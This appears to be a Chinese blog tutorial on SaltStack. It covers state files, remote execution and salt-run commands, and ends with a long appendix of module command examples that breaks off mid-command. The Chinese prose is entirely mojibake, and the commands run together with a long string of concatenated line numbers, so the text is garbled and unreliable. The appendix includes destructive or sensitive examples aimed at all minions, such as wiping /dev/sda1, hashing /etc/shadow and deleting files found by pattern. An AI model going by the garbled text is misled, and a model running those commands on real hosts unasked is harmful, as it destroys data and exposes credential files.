¹ç›®å½•åœ¨/srv/saltä¸­ï¼Œå¦‚æœæ²¡æœ‰éœ€è¦è¿›è¡Œå»ºç«‹ã€‚top.slsï¼šè¿™ä¸ªæ–‡ä»¶ç±»ä¼¼äºpuppetçš„site.ppæ–‡ä»¶ï¼Œä½œä¸ºâ€œæœ€é«˜åŒæ­¥â€æ“ä½œçš„å…¥å£æ–‡ä»¶ï¼Œæ‰§è¡Œâ€œæœ€é«˜åŒæ­¥â€æ“ä½œæ—¶ï¼Œå°†ä»æ­¤slsæ–‡ä»¶ä¸­è·å–çŠ¶æ€å¯¹minionè¿›è¡ŒåŒæ­¥ç¤ºä¾‹ï¼š(æ³¨æ„ï¼Œsaltæ–‡ä»¶å®Œå…¨é‡‡ç”¨ymalæ ¼å¼ï¼Œå¯¹ä»£ç çš„ç¼©è¿›æœ‰ç€ä¸¥æ ¼çš„è¦æ±‚)#vim /srv/salt/servers_package.slshttpd: é¡¹ç›®åpkg: ç±»å‹â€“ installed åŠ¨ä½œ(è¡¨ç¤ºå®‰è£…httpdåŒ…)service:â€“ runningâ€“ enable:Truevim-enhanced:pkg:â€“ installedtomcatç¯å¢ƒopenjdk-7-jdk:pkg:â€“ installedtomcat7:pkg:â€“ installedâ€“ require:â€“ pkg: openjdk-7-jdk# salt â€˜wy-pe2â€² state.sls servers_package æŒ‰ç…§slsæ–‡ä»¶ä¸­çš„é…ç½®å¯¹wy-pe2è¿›è¡ŒæœåŠ¡é…ç½® ç®¡ç†é…ç½®æ–‡ä»¶123456789101112131415161718192021222324252627282930313233343536373839httpd:pkg:â€“ installedfile.managed: æ–‡ä»¶ç®¡ç†(æ–‡ä»¶åŒæ­¥æ“ä½œ)â€“ name: /etc/httpd/conf/httpd.confâ€“ source: salt://httpd/httpd.conf# salt â€˜wy-pe2â€² state.highstate åº”ç”¨ä¿®æ”¹(ç»™minionæ°¸ä¹…æ·»åŠ çŠ¶æ€)3.ä½¿ç”¨salt scheduleå¯¹minionè¿›è¡Œå®æ—¶æ›´æ–°ï¼Œè®©minionè‡ªè§‰çš„ä¿æŒæŸä¸ªçŠ¶æ€4.å®æ—¶ç®¡ç†æœ‰æ—¶å€™æˆ‘ä»¬éœ€è¦ä¸´æ—¶çš„æŸ¥çœ‹æŸä¸ªæœºå™¨ä¸Šçš„æŸä¸ªæ–‡ä»¶ï¼Œæˆ–è€…æ‰§è¡ŒæŸä¸ªå‘½ä»¤cmd.runæ–¹å¼ï¼š(salt â€˜$targetingâ€™ cmd.run â€˜$cmdâ€™)ç”¨æ¥è¿œç¨‹æ‰§è¡Œshellå‘½ä»¤# salt â€˜wy-pe2â€² cmd.run â€˜ifconfig eth0â€² æŸ¥çœ‹æŸå°ä¸»æœºçš„ç½‘ç»œæ¥å£cmd.scriptæ–¹å¼ï¼šå¯ä»¥å‘è¿œç¨‹ä¸»æœºæ‰§è¡Œè„šæœ¬#salt â€˜*â€™ cmd.script salt://useradd.sh å‘minionä¸»æœºä¸Šæ‰§è¡Œuseradd.shè„šæœ¬(salt://æ˜¯saltçš„é»˜è®¤å‘å¸ƒç›®å½•ï¼Œå³/srv/salt)pkg.installæ–¹å¼ï¼šåˆ¶å®šä¸»æœºå®‰è£…è½¯ä»¶#salt â€˜wy-pe2â€² pkg.install vsftpd æŒ‡å®šä¸»æœºå®‰è£…è½¯ä»¶# salt â€˜*â€™ network.interfaces æŸ¥çœ‹è¿œç¨‹ä¸»æœºæ¥å£# salt-cp â€˜wy-pe2â€² salt-cmd /home/xxb2 å¤åˆ¶æ–‡ä»¶åˆ°æŒ‡å®šçš„ç³»ç»Ÿä¸Š(å½“å‰ç›®å½•çš„salt-cmd)saltæ˜¯ä¸»å‘½ä»¤ï¼Œä¸€èˆ¬ç”¨æ¥æ‰§è¡Œå‘½ä»¤æ¨¡å—ã€‚salt-cpç”¨æ¥å¤åˆ¶æ–‡ä»¶åˆ°åˆ¶å®šçš„ç³»ç»Ÿä¸Šå»salt-keyç”¨æ¥å’Œminionä¹‹é—´è¿›è¡Œèº«ä»½éªŒè¯salt-masterä¸ºæœåŠ¡ç«¯çš„ä¸»å®ˆæŠ¤è¿›ç¨‹ç”¨äºæ§åˆ¶minionsalt-runä¸ºå‰ç«¯å‘½ä»¤æ‰§è¡Œmoduleæ–¹å¼ï¼š(æ¨¡å—æŸ¥çœ‹æ–¹å¼#salt â€˜*â€™ sys.doc)#salt â€˜*â€™ disk.usage æŸ¥çœ‹ç£ç›˜ä½¿ç”¨æƒ…å†µ# salt â€˜*â€™ grains.item os/osrelease/oscodename# salt â€˜*â€™ user(group).info xxb2# salt â€˜*â€™ ip.get_interface eth0#salt â€˜*â€™ lvm.vgdisplay saltç›¸å…³ç®¡ç†å‘½ä»¤ï¼š12345salt-run manage.up æŸ¥çœ‹å­˜æ´»çš„minionsalt-run manage.down æŸ¥çœ‹æ­»æ‰çš„minionsalt-run manage.down removekeys=True æŸ¥çœ‹downæ‰çš„minionï¼Œå¹¶å°†å…¶åˆ é™¤salt-run manage.status æŸ¥çœ‹minionçš„ç›¸å…³çŠ¶æ€salt-run manage.versions æŸ¥çœ‹slatçš„æ‰€æœ‰masterå’Œminionçš„ç‰ˆæœ¬ä¿¡æ¯ é™„å½•ï¼šsaltè¯¦ç»†ä½¿ç”¨å‘½ä»¤12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697989910010110210310410510610710810911011111211311411511611711811912012112212312412512612712812913013113213313413513613713813914014114214314414514614714814915015115215315415515615715815916016116216316416516616716816917017117217317417517617717817918018118218318418518618718818919019119219319419519619719819920020120220320420520620720820921021121221321421521621721821922022122222322422522622722822923023123223323423523623723823924024124224324424524624724824925025125225325425525625725825926026126226326426526626726826927027127227327427527627727827928028128228328428528628728828929029129229329429529629729829930030130230330430530630730830931031131231331431531631731831932032132232332432532632732832933033133233333433533633733833934034134234334434534634734834935035135235335435535635735835936036136236336436536636736836937037137237337437537637737837938038138238338438538638738838939039139239339439539639739839940040140240340440540640740840941041141241341441541641741841942042142242342442542642742842943043143243343443543643743843944044144244344444544644744844945045145245345445545645745845946046146246346446546646746846947047147247347447547647747847948048148248348448548648748848949049149249349449549649749849950050150250350450550650750850951051151251351451551651751851952052152252352452552652752852953053153253353453553653753853954054154254354454554654754854955055155255355455555655755855956056156256356456556656756856957057157257357457557657757857958058158258358458558658758858959059159259359459559659759859960060160260360460560660760860961061161261361461561661761861962062162262362462562662762862963063163263363463563663763863964064164264364464564664764864965065165265365465565665765865966066166266366466566666766866967067167267367467567667767867968068168268368468568668768868969069169269369469569669769869970070170270370470570670770870971071171271371471571671771871972072172272372472572672772872973073173273373473573673773873974074174274374474574674774874975075175275375475575675775875976076176276376476576676776876977077177277377477577677777877978078178278378478578678778878979079179279379479579679779879980080180280380480580680780880981081181281381481581681781881982082182282382482582682782882983083183283383483583683783883984084184284384484584684784884985085185285385485585685785885986086186286386486586686786886987087187287387487587687787887988088188288388488588688788888989089189289389489589689789889990090190290390490590690790890991091191291391491591691791891992092192292392492592692792892993093193293393493593693793893994094194294394494594694794894995095195295395495595695795895996096196296396496596696796896997097197297397497597697797897998098198298398498598698798898999099199299399499599699799899910001001100210031004100510061007100810091010101110121013101410151016101710181019102010211022102310241025102610271028102910301031103210331034salt â€˜*â€™ acl.delfacl user myuser /tmp/house/kitchensalt â€˜*â€™ acl.delfacl default:group mygroup /tmp/house/kitchensalt â€˜*â€™ acl.delfacl d:u myuser /tmp/house/kitchensalt â€˜*â€™ acl.delfacl g myuser /tmp/house/kitchen /tmp/house/livingroomsalt â€˜*â€™ acl.getfacl /tmp/house/kitchensalt â€˜*â€™ acl.getfacl /tmp/house/kitchen /tmp/house/livingroomsalt â€˜*â€™ acl.addfacl user myuser rwx /tmp/house/kitchensalt â€˜*â€™ acl.addfacl default:group mygroup rx /tmp/house/kitchensalt â€˜*â€™ acl.addfacl d:u myuser 7 /tmp/house/kitchensalt â€˜*â€™ acl.addfacl g mygroup 0 /tmp/house/kitchen /tmp/house/livingroomsalt â€˜*â€™ acl.versionsalt â€˜*â€™ acl.wipefacls /tmp/house/kitchensalt â€˜*â€™ acl.wipefacls /tmp/house/kitchen /tmp/house/livingroomsalt â€˜*â€™ aliases.get_target aliassalt â€˜*â€™ aliases.has_target alias targetsalt â€˜*â€™ aliases.list_aliasessalt â€˜*â€™ aliases.rm_alias aliassalt â€˜*â€™ aliases.set_target alias targetsalt â€˜*â€™ alternatives.auto namesalt â€˜*â€™ alternatives.check_installed name pathsalt â€˜*â€™ alternatives.display editorsalt â€˜*â€™ alternatives.install editor /usr/bin/editor /usr/bin/emacs23 50salt â€˜*â€™ alternatives.remove name pathsalt â€˜*â€™ alternatives.set name pathsalt â€˜*â€™ alternatives.show_current editorsalt â€˜*â€™ apache.config /etc/httpd/conf.d/ports.conf config=â€[&#123;â€˜Listen': â€™22â€™&#125;]â€salt â€˜*â€™ apache.directivessalt â€˜*â€™ apache.fullversionsalt â€˜*â€™ apache.modulessalt â€˜*â€™ apache.server_statussalt â€˜*â€™ apache.server_status other-profilesalt â€˜*â€™ apache.servermodssalt â€˜*â€™ apache.signal restartsalt â€˜*â€™ apache.useradd /etc/httpd/htpasswd larry badpasswordsalt â€˜*â€™ apache.useradd /etc/httpd/htpasswd larry badpass opts=nssalt â€˜*â€™ apache.userdel /etc/httpd/htpasswd larrysalt â€˜*â€™ apache.versionsalt â€˜*â€™ archive.gunzip template=jinja /tmp/&#123;&#123;grains.id&#125;&#125;.txt.gzsalt â€˜*â€™ archive.gunzip /tmp/sourcefile.txt.gzsalt â€˜*â€™ archive.gzip template=jinja /tmp/&#123;&#123;grains.id&#125;&#125;.txtsalt â€˜*â€™ archive.gzip /tmp/sourcefile.txtsalt â€˜*â€™ archive.rar template=jinja /tmp/rarfile.rar â€˜/tmp/sourcefile1,/tmp/&#123;&#123;grains.id&#125;&#125;.txtâ€™salt â€˜*â€™ archive.rar /tmp/rarfile.rar /tmp/sourcefile1,/tmp/sourcefile2salt â€˜*â€™ archive.tar cjvf /tmp/salt.tar.bz2 &#123;&#123;grains.saltpath&#125;&#125; template=jinjasalt â€˜*â€™ archive.tar cjvf /tmp/tarfile.tar.bz2 /tmp/file_1,/tmp/file_2salt â€˜*â€™ archive.tar xf foo.tar dest=/target/directorysalt â€˜*â€™ archive.unrar template=jinja /tmp/rarfile.rar /tmp/&#123;&#123;grains.id&#125;&#125;/ excludes=file_1,file_2salt â€˜*â€™ archive.unrar /tmp/rarfile.rar /home/strongbad/ excludes=file_1,file_2salt â€˜*â€™ archive.unzip template=jinja /tmp/zipfile.zip /tmp/&#123;&#123;grains.id&#125;&#125;/ excludes=file_1,file_2salt â€˜*â€™ archive.unzip /tmp/zipfile.zip /home/strongbad/ excludes=file_1,file_2salt â€˜*â€™ archive.zip template=jinja /tmp/zipfile.zip /tmp/sourcefile1,/tmp/&#123;&#123;grains.id&#125;&#125;.txtsalt â€˜*â€™ archive.zip /tmp/zipfile.zip /tmp/sourcefile1,/tmp/sourcefile2salt â€˜*â€™ extfs.dump /dev/sda1salt â€˜*â€™ blockdev.tune /dev/sda1 read-ahead=1024 read-write=Truesalt â€˜*â€™ blockdev.wipe /dev/sda1salt â€˜*â€™ bridge.add br0salt â€˜*â€™ bridge.addif br0 eth0salt â€˜*â€™ bridge.delete br0salt â€˜*â€™ bridge.delif br0 eth0salt â€˜*â€™ bridge.find_interfaces eth0 [eth1â€¦]salt â€˜*â€™ bridge.interfaces br0salt â€˜*â€™ bridge.listsalt â€˜*â€™ bridge.showsalt â€˜*â€™ bridge.show br0salt â€˜*â€™ bridge.stp br0 enablesalt â€˜*â€™ bridge.stp br0 disablesalt â€˜*â€™ bridge.stp bridge0 enable fxp0salt â€˜*â€™ bridge.stp bridge0 disable fxp0salt â€˜*â€™ buildout.bootstrap /srv/mybuildoutsalt â€˜*â€™ buildout.buildout /srv/mybuildoutsalt â€˜*â€™ buildout.run_buildout /srv/mybuildoutsalt â€˜*â€™ buildout.upgrade_bootstrap /srv/mybuildoutsalt â€˜*â€™ cloud.action start instance=myinstancesalt â€˜*â€™ cloud.action stop instance=myinstancesalt â€˜*â€™ cloud.action show_image provider=my-ec2-config image=ami-1624987fsalt â€˜*â€™ cloud.destroy myinstancesalt â€˜*â€™ cloud.full_querysalt â€˜*â€™ cloud.list_images my-gce-configsalt â€˜*â€™ cloud.list_locations my-gce-configsalt â€˜*â€™ cloud.list_sizes my-gce-configsalt â€˜*â€™ cloud.profile my-gce-config myinstancesalt â€˜*â€™ cloud.querysalt â€˜*â€™ cloud.query list_nodes_fullsalt â€˜*â€™ cloud.query list_nodes_selectsalt â€˜*â€™ cloud.select_querysalt â€˜*â€™ cmd.exec_code ruby â€˜puts â€œcheeseâ€â€˜salt â€˜*â€™ cmd.has_exec catsalt â€˜*â€™ cmd.retcode â€œfile /bin/bashâ€salt â€˜*â€™ cmd.retcode template=jinja â€œfile &#123;&#123;grains.pythonpath[0]&#125;&#125;/pythonâ€salt â€˜*â€™ cmd.retcode â€œgrep fâ€ stdin=â€™one\\ntwo\\nthree\\nfour\\nfive\\nâ€™salt â€˜*â€™ cmd.run â€œls -l | awk â€˜/foo/&#123;print \\$2&#125;'â€salt â€˜*â€™ cmd.run template=jinja â€œls -l /tmp/&#123;&#123;grains.id&#125;&#125; | awk â€˜/foo/&#123;print \\$2&#125;'â€salt â€˜*â€™ cmd.run â€œGet-ChildItem C:\\ â€ shell=â€™powershellâ€™salt â€˜*â€™ cmd.run â€œgrep fâ€ stdin=â€™one\\ntwo\\nthree\\nfour\\nfive\\nâ€™salt â€˜*â€™ cmd.run cmd=â€™sed -e s/=/:/gâ€™salt â€˜*â€™ cmd.run_all â€œls -l | awk â€˜/foo/&#123;print \\$2&#125;'â€salt â€˜*â€™ cmd.run_all template=jinja â€œls -l /tmp/&#123;&#123;grains.id&#125;&#125; | awk â€˜/foo/&#123;print \\$2&#125;'â€salt â€˜*â€™ cmd.run_all â€œgrep fâ€ stdin=â€™one\\ntwo\\nthree\\nfour\\nfive\\nâ€™salt â€˜*â€™ cmd.run_chroot /var/lib/lxc/container_name/rootfs â€˜sh /tmp/bootstrap.shâ€™salt â€˜*â€™ cmd.run_stderr â€œls -l | awk â€˜/foo/&#123;print \\$2&#125;'â€salt â€˜*â€™ cmd.run_stderr template=jinja â€œls -l /tmp/&#123;&#123;grains.id&#125;&#125; | awk â€˜/foo/&#123;print \\$2&#125;'â€salt â€˜*â€™ cmd.run_stderr â€œgrep fâ€ stdin=â€™one\\ntwo\\nthree\\nfour\\nfive\\nâ€™salt â€˜*â€™ cmd.run_stdout â€œls -l | awk â€˜/foo/&#123;print \\$2&#125;'â€salt â€˜*â€™ cmd.run_stdout template=jinja â€œls -l /tmp/&#123;&#123;grains.id&#125;&#125; | awk â€˜/foo/&#123;print \\$2&#125;'â€salt â€˜*â€™ cmd.run_stdout â€œgrep fâ€ stdin=â€™one\\ntwo\\nthree\\nfour\\nfive\\nâ€™salt â€˜*â€™ cmd.script salt://scripts/runme.shsalt â€˜*â€™ cmd.script salt://scripts/runme.sh â€˜arg1 arg2 â€œarg 3â€³â€˜salt â€˜*â€™ cmd.script salt://scripts/windows_task.ps1 args=â€™ -Input c:\\tmp\\infile.txtâ€™ shell=â€™powershellâ€™salt â€˜*â€™ cmd.script salt://scripts/runme.sh stdin=â€™one\\ntwo\\nthree\\nfour\\nfive\\nâ€™salt â€˜*â€™ cmd.script_retcode salt://scripts/runme.shsalt â€˜*â€™ cmd.script_retcode salt://scripts/runme.sh stdin=â€™one\\ntwo\\nthree\\nfour\\nfive\\nâ€™salt â€˜*â€™ cmd.tty tty0 â€˜This is a testâ€™salt â€˜*â€™ cmd.tty pts3 â€˜This is a testâ€™salt â€˜*â€™ cmd.which catsalt â€˜*â€™ cmd.which_bin â€˜[pip2, pip, pip-python]â€™salt â€˜*â€™ composer.install /var/www/applicationsalt â€˜*â€™ composer.install /var/www/application no_dev=True optimize=Truesalt â€˜*â€™ config.backup_modesalt â€˜*â€™ config.dot_vals hostsalt â€˜*â€™ config.get pkg:apachesalt â€˜*â€™ config.manage_modesalt â€˜*â€™ config.merge schedulesalt â€˜*â€™ config.option redis.hostsalt â€˜*â€™ config.valid_fileproto salt://path/to/filesalt â€˜*â€™ cp.cache_dir salt://path/to/dirsalt â€˜*â€™ cp.cache_dir salt://path/to/dir include_pat=â€™E@*.py$â€™salt â€˜*â€™ cp.cache_file salt://path/to/filesalt â€˜*â€™ cp.cache_files salt://pathto/file1,salt://pathto/file1salt â€˜*â€™ cp.cache_local_file /etc/hostssalt â€˜*â€™ cp.cache_mastersalt â€˜*â€™ cp.get_dir salt://path/to/dir/ /minion/destsalt â€˜*â€™ cp.get_file salt://path/to/file /minion/destsalt â€˜*â€™ cp.get_file â€œsalt://&#123;&#123;grains.os&#125;&#125;/vimrcâ€ /etc/vimrc template=jinjasalt â€˜*â€™ cp.get_file_str salt://my/filesalt â€˜*â€™ cp.get_template salt://path/to/template /minion/destsalt â€˜*â€™ cp.get_url salt://my/file /tmp/minesalt â€˜*â€™ cp.get_url http://www.slashdot.org /tmp/index.htmlsalt â€˜*â€™ cp.hash_file salt://path/to/filesalt â€˜*â€™ cp.is_cached salt://path/to/filesalt â€˜*â€™ cp.list_mastersalt â€˜*â€™ cp.list_master_dirssalt â€˜*â€™ cp.list_master_symlinkssalt â€˜*â€™ cp.list_minionsalt â€˜*â€™ cp.list_statessalt â€˜*â€™ cp.push /etc/fstabsalt â€˜*â€™ cp.push /usr/lib/mysqlsalt â€˜*â€™ cp.push_dir /etc/modprobe.d/ glob=â€™*.confâ€™salt â€˜*â€™ cron.list_tab rootsalt â€˜*â€™ cron.list_tab rootsalt â€˜*â€™ cron.raw_cron rootsalt â€˜*â€™ cron.rm_job root /usr/local/weeklysalt â€˜*â€™ cron.rm_job root /usr/bin/foo dayweek=1salt â€˜*â€™ cron.rm_env root MAILTOsalt â€˜*â€™ cron.rm_job root /usr/local/weeklysalt â€˜*â€™ cron.rm_job root /usr/bin/foo dayweek=1salt â€˜*â€™ cron.set_env root MAILTO user@example.comsalt â€˜*â€™ cron.set_job root â€˜*â€™ â€˜*â€™ â€˜*â€™ â€˜*â€™ 1 /usr/local/weeklysalt â€˜*â€™ cron.set_special root @hourly â€˜echo foobarâ€™salt â€˜*â€™ cron.write_cron_file root /tmp/new_cronsalt â€˜*â€™ cron.write_cron_file_verbose root /tmp/new_cronsalt â€˜*â€™ daemontools.available foosalt â€˜*â€™ daemontools.full_restart &lt;service name&gt;salt â€˜*â€™ daemontools.get_allsalt â€˜*â€™ daemontools.missing foosalt â€˜*â€™ daemontools.reload &lt;service name&gt;salt â€˜*â€™ daemontools.restart &lt;service name&gt;salt â€˜*â€™ daemontools.start &lt;service name&gt;salt â€˜*â€™ daemontools.status &lt;service name&gt;salt â€˜*â€™ daemontools.stop &lt;service name&gt;salt â€˜*â€™ daemontools.term &lt;service name&gt;salt â€˜*â€™ data.cas &lt;key&gt; &lt;value&gt; &lt;old_value&gt;salt â€˜*â€™ data.clearsalt â€˜*â€™ data.dump â€˜&#123;â€˜eggs': â€˜spamâ€™&#125;â€™salt â€˜*â€™ data.getval &lt;key&gt;salt â€˜*â€™ data.getvals &lt;key&gt; [&lt;key&gt; â€¦]salt â€˜*â€™ data.loadsalt â€˜*â€™ data.update &lt;key&gt; &lt;value&gt;salt â€˜*â€™ defaults.get core:users:rootsalt â€˜*â€™ disk.blkidsalt â€˜*â€™ disk.blkid /dev/sdasalt â€˜*â€™ disk.inodeusagesalt â€˜*â€™ disk.percent /varsalt â€˜*â€™ disk.usagesalt â€˜*â€™ django.collectstatic &lt;settings_module&gt;salt â€˜*â€™ django.command &lt;settings_module&gt; &lt;command&gt;salt â€˜*â€™ django.createsuperuser &lt;settings_module&gt; user user@example.comsalt â€˜*â€™ django.loaddata &lt;settings_module&gt; &lt;comma delimited list of fixtures&gt;salt â€˜*â€™ django.syncdb &lt;settings_module&gt;salt â€˜*â€™ dnsmasq.versionsalt â€˜*â€™ dnsmasq.get_configsalt â€˜*â€™ dnsmasq.get_config file=/etc/dnsmasq.confsalt â€˜*â€™ dnsmasq.set_config domain=mydomain.comsalt â€˜*â€™ dnsmasq.set_config follow=False domain=mydomain.comsalt â€˜*â€™ dnsmasq.set_config file=/etc/dnsmasq.conf domain=mydomain.comsalt â€˜*â€™ dnsmasq.versionsalt â€˜*â€™ dnsutil.hosts_append /etc/hosts 127.0.0.1 ad1.yuk.co,ad2.yuk.cosalt â€˜*â€™ dnsutil.hosts_remove /etc/hosts ad1.yuk.cosalt â€˜*â€™ dnsutil.hosts_remove /etc/hosts ad2.yuk.co,ad1.yuk.cosalt â€˜*â€™ dnsutil.parse_hostssalt â€˜*â€™ environ.get foosalt â€˜*â€™ environ.get baz default=Falsesalt â€˜*â€™ environ.has_value foosalt â€˜*â€™ environ.item foosalt â€˜*â€™ environ.item â€˜[foo, baz]â€™ default=Nonesalt â€˜*â€™ environ.itemssalt â€˜*â€™ environ.setenv â€˜&#123;â€œfooâ€: â€œbarâ€, â€œbazâ€: â€œquuxâ€&#125;â€™salt â€˜*â€™ environ.setenv â€˜&#123;â€œaâ€: â€œbâ€, â€œcâ€: False&#125;â€™ false_unsets=Truesalt â€˜*â€™ environ.setval foo barsalt â€˜*â€™ environ.setval baz val=False false_unsets=Truesalt â€˜*â€™ event.fire â€˜&#123;â€œdataâ€:â€my event dataâ€&#125;â€™ â€˜tagâ€™salt â€˜*â€™ event.fire_master â€˜&#123;â€œdataâ€:â€my event dataâ€&#125;â€™ â€˜tagâ€™salt â€˜*â€™ extfs.attributes /dev/sda1salt â€˜*â€™ extfs.blocks /dev/sda1salt â€˜*â€™ extfs.dump /dev/sda1salt â€˜*â€™ extfs.mkfs /dev/sda1 fs_type=ext4 opts=â€™acl,noexecâ€™salt â€˜*â€™ extfs.tune /dev/sda1 force=True label=wildstallyns opts=â€™acl,noexecâ€™salt â€˜*â€™ file.access /path/to/file fsalt â€˜*â€™ file.access /path/to/file xsalt â€˜*â€™ file.append /etc/motd \\salt â€˜*â€™ file.append /etc/motd args=â€™cheese=spamâ€™salt â€˜*â€™ file.append /etc/motd args=â€[â€˜cheese=spamâ€™,â€™spam=cheeseâ€™]â€salt â€˜*â€™ file.blockreplace /etc/hosts â€˜#â€“ start managed zone foobar : DO NOT EDIT â€“â€˜ \\salt â€˜*â€™ file.check_file_meta /etc/httpd/conf.d/httpd.conf salt://http/httpd.conf â€˜&#123;hash_type: â€˜md5â€², â€˜hsum': &lt;md5sum&gt;&#125;â€™ root, root, â€˜755â€™ basesalt â€˜*â€™ file.check_hash /etc/fstab md5:&lt;md5sum&gt;salt â€˜*â€™ file.check_managed /etc/httpd/conf.d/httpd.conf salt://http/httpd.conf â€˜&#123;hash_type: â€˜md5â€², â€˜hsum': &lt;md5sum&gt;&#125;â€™ root, root, â€˜755â€™ jinja True None None basesalt â€˜*â€™ file.check_managed_changes /etc/httpd/conf.d/httpd.conf salt://http/httpd.conf â€˜&#123;hash_type: â€˜md5â€², â€˜hsum': &lt;md5sum&gt;&#125;â€™ root, root, â€˜755â€™ jinja True None None basesalt â€˜*â€™ file.check_perms /etc/sudoers â€˜&#123;&#125;â€™ root root 400salt â€˜*â€™ file.chgrp /etc/passwd rootsalt â€˜*â€™ file.chown /etc/passwd root rootsalt â€˜*â€™ file.comment /etc/modules pcspkrsalt â€˜*â€™ file.contains /etc/crontab â€˜mymaintenance.shâ€™salt â€˜*â€™ file.contains_glob /etc/foobar â€˜*cheese*â€™salt â€˜*â€™ file.contains_regex /etc/crontabsalt â€˜*â€™ file.contains_regex_multiline /etc/crontab â€˜^maintâ€™salt â€˜*â€™ file.copy /path/to/src /path/to/dstsalt â€˜*â€™ file.copy /path/to/src_dir /path/to/dst_dir recurse=Truesalt â€˜*â€™ file.copy /path/to/src_dir /path/to/dst_dir recurse=True remove_existing=Truesalt â€˜*â€™ file.restore_backup /foo/bar/baz.txt 0salt â€˜*â€™ file.directory_exists /etcsalt â€˜*â€™ file.extract_hash /etc/foo sha512 /path/to/hash/filesalt â€˜*â€™ file.file_exists /etc/passwdsalt â€˜*â€™ file.find / type=f name=\\*.bak size=+10msalt â€˜*â€™ file.find /var mtime=+30d size=+10m print=path,size,mtimesalt â€˜*â€™ file.find /var/log name=\\*.[0-9] mtime=+30d size=+10m deletesalt â€˜*â€™ file.get_devmm /dev/chrsalt â€˜*â€™ file.get_diff /home/fred/.vimrc salt://users/fred/.vimrcsalt â€˜*â€™ file.get_gid /etc/passwdsalt â€˜*â€™ file.get_group /etc/passwdsalt â€˜*â€™ file.get_hash /etc/shadowsalt â€˜*â€™ file.get_managed /etc/httpd/conf.d/httpd.conf jinja salt://http/httpd.conf â€˜&#123;hash_type: â€˜md5â€², â€˜hsum': &lt;md5sum&gt;&#125;â€™ root root â€˜755â€™ base None Nonesalt â€˜*â€™ file.get_mode /etc/passwdsalt â€˜*â€™ file.get_selinux_context /etc/hostssalt â€˜*â€™ file.get_sum /etc/passwd sha512salt â€˜*â€™ file.get_uid /etc/passwdsalt â€˜*â€™ file.get_user /etc/passwdsalt â€˜*â€™ file.gid_to_group 0salt â€˜*â€™ file.grep /etc/passwd nobodysalt â€˜*â€™ file.grep /etc/sysconfig/network-scripts/ifcfg-eth0 ipaddr â€ -iâ€salt â€˜*â€™ file.grep /etc/sysconfig/network-scripts/ifcfg-eth0 ipaddr â€ -i -B2â€³salt â€˜*â€™ file.grep â€œ/etc/sysconfig/network-scripts/*â€ ipaddr â€ -i -lâ€salt â€˜*â€™ file.group_to_gid rootsalt â€˜*â€™ file.is_blkdev /dev/blksalt â€˜*â€™ file.is_chrdev /dev/chrsalt â€˜*â€™ file.is_fifo /dev/fifosalt â€˜*â€™ file.is_link /path/to/linksalt â€˜*â€™ file.join â€˜/â€™ â€˜usrâ€™ â€˜localâ€™ â€˜binâ€™salt â€˜*â€™ file.chown /etc/passwd root rootsalt â€˜*â€™ file.link /path/to/file /path/to/linksalt â€˜*â€™ file.list_backups /foo/bar/baz.txtsalt â€˜*â€™ file.list_backups /foo/bar/baz.txtsalt â€˜*â€™ file.lstat /path/to/filesalt â€˜*â€™ file.makedirs /opt/code/salt â€˜*â€™ file.makedirs_perms /opt/codesalt â€˜*â€™ file.manage_file /etc/httpd/conf.d/httpd.conf â€ â€˜&#123;&#125;â€™ salt://http/httpd.conf â€˜&#123;hash_type: â€˜md5â€², â€˜hsum': &lt;md5sum&gt;&#125;â€™ root root â€˜755â€™ base â€salt â€˜*â€™ file.mkdir /opt/jetty/contextsalt â€˜*â€™ file.mknod /dev/chr c 180 31salt â€˜*â€™ file.mknod /dev/blk b 8 999salt â€˜*â€™ file.nknod /dev/fifo psalt â€˜*â€™ file.mknod_blkdev /dev/blk 8 999salt â€˜*â€™ file.mknod_chrdev /dev/chr 180 31salt â€˜*â€™ file.mknod_fifo /dev/fifosalt â€˜*â€™ file.open_filessalt â€˜*â€™ file.open_files by_pid=Truesalt â€˜*â€™ file.pardirsalt â€˜*â€™ file.patch /opt/file.txt /tmp/file.txt.patchsalt â€˜*â€™ file.path_exists_glob /etc/pam*/pass*salt â€˜*â€™ file.prepend /etc/motd \\salt â€˜*â€™ file.prepend /etc/motd args=â€™cheese=spamâ€™salt â€˜*â€™ file.prepend /etc/motd args=â€[â€˜cheese=spamâ€™,â€™spam=cheeseâ€™]â€salt â€˜*â€™ file.sed /etc/httpd/httpd.conf â€˜LogLevel warnâ€™ â€˜LogLevel infoâ€™salt â€˜*â€™ file.readdir /path/to/dir/salt â€˜*â€™ file.readlink /path/to/linksalt â€˜*â€™ file.remove /tmp/foosalt â€˜*â€™ file.restore_backup /foo/bar/baz.txt 0salt â€˜*â€™ file.rename /path/to/src /path/to/dstsalt â€˜*â€™ file.replace /path/to/file pattern=â€bind-address\\s*=â€ repl=â€™bind-address:â€™salt â€˜*â€™ file.replace /path/to/file pattern=â€™=â€™ repl=':â€™salt â€˜*â€™ file.replace /etc/httpd/httpd.conf pattern=â€™LogLevel warnâ€™ repl=â€™LogLevel infoâ€™salt â€˜*â€™ file.replace /some/file pattern=â€™beforeâ€™ repl=â€™afterâ€™ flags='[MULTILINE, IGNORECASE]â€™salt â€˜*â€™ file.restore_backup /foo/bar/baz.txt 0salt â€˜*â€™ file.restorecon /home/user/.ssh/authorized_keyssalt â€˜*â€™ file.rmdir /tmp/foo/salt â€˜*â€™ file.search /etc/crontab â€˜mymaintenance.shâ€™salt â€˜*â€™ file.sed /etc/httpd/httpd.conf â€˜LogLevel warnâ€™ â€˜LogLevel infoâ€™salt â€˜*â€™ file.contains /etc/crontab â€˜mymaintenance.shâ€™salt â€˜*â€™ file.seek_read /path/to/file 4096 0salt â€˜*â€™ file.seek_write /path/to/file â€˜some dataâ€™ 4096salt â€˜*â€™ file.set_mode /etc/passwd 0644salt â€˜*â€™ file.set_selinux_context path &lt;role&gt; &lt;type&gt; &lt;range&gt;salt â€˜*â€™ file.source_list salt://http/httpd.conf â€˜&#123;hash_type: â€˜md5â€², â€˜hsum': &lt;md5sum&gt;&#125;â€™ basesalt â€˜*â€™ file.stats /etc/passwdsalt â€˜*â€™ file.statvfs /path/to/filesalt â€˜*â€™ file.symlink /path/to/file /path/to/linksalt â€˜*â€™ file.touch /var/log/emptyfilesalt â€˜*â€™ file.truncate /path/to/file 512salt â€˜*â€™ file.uid_to_user 0salt â€˜*â€™ file.uncomment /etc/hosts.deny â€˜ALL: PARANOIDâ€™salt â€˜*â€™ file.user_to_uid rootsalt â€˜*â€™ file.write /etc/motd \\salt â€˜*â€™ file.write /etc/motd args=â€™cheese=spamâ€™salt â€˜*â€™ file.write 